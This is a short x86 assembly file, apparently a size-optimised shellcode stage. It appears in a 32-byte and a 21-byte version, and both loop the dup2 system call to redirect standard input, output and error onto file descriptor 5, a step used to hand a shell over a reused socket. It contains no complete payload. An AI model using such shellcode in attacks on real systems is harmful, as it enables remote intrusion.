# 32 bytes
#.section .text
#.global _start
#
#_start:
#    jmp end
#begin:
#    popl %esi
#    movl (%esi), %edi
#
#    xor %ecx, %ecx #int newfd
#dup2:
#    xor %eax, %eax
#    movb $0x3f, %al # sys_dup2(int oldfd, int newfd)
#    mov %edi, %ebx #int olddf
#    int $0x80
#    inc %ecx
#    cmp $0x04, %ecx
#    jnz dup2
#
#    jmp next_stage
#
#end:
#    call begin
#
#fd:
#.long 5
#
#next_stage:


# 21 bytes
.section .text
.global _start

_start:
    movl $0x05, %edi

    xor %ecx, %ecx #int newfd
dup2:
    xor %eax, %eax
    movb $0x3f, %al # sys_dup2(int oldfd, int newfd)
    mov %edi, %ebx #int olddf
    int $0x80
    inc %ecx
    cmp $0x04, %ecx
    jnz dup2

